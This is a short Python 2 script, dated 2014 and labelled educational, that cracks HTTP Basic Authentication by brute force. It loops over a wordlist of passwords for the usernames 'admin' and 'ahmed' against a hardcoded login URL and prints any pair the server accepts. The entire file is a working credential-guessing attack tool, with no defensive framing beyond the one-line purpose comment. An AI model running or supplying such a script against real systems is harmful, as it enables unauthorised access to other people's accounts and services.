#!/usr/bin/env python
# Author: Boumediene Kaddour
# Country: Algeria (Maghnia)
# Date: 04/12/2014
# Purpose: ducational purpose (Cracking Basic Authentication)

from sys import argv
import requests
import base64
from colorama import Fore as foreground

if len(argv) != 2:
	print "Usage:\n\t python %s worldlist.txt\n"%argv[0]
	exit(1)

wordlist = open(argv[1], "r")
# Here where you have to put your url (Path to the login page)
url = 'http://172.16.122.2/secret'
words = wordlist.readlines()

for user in ["admin", "ahmed"] :
	for passwd in words:
		user_pass = "%s:%s"%(user,passwd.strip())
		base64_value = base64.encodestring(user_pass).split()[0]
		hdr = {'Authorization': "Basic %s"%base64_value}
		try:
        		res = requests.get(url, headers = hdr)
          	except:
			print "No such URL"
			exit(1)
		if res.status_code == 200 :
                       print foreground.GREEN + "%s CRACKED: "%res.status_code + user + ":" + passwd + foreground.RESET
                       exit(0)
                elif res.status_code == 401 :
                        print "FAILED %s: %s:%s" %(res.status_code, user,passwd)
                else:
                        print "Unexpected Status Code: %d "%res.status_code
		
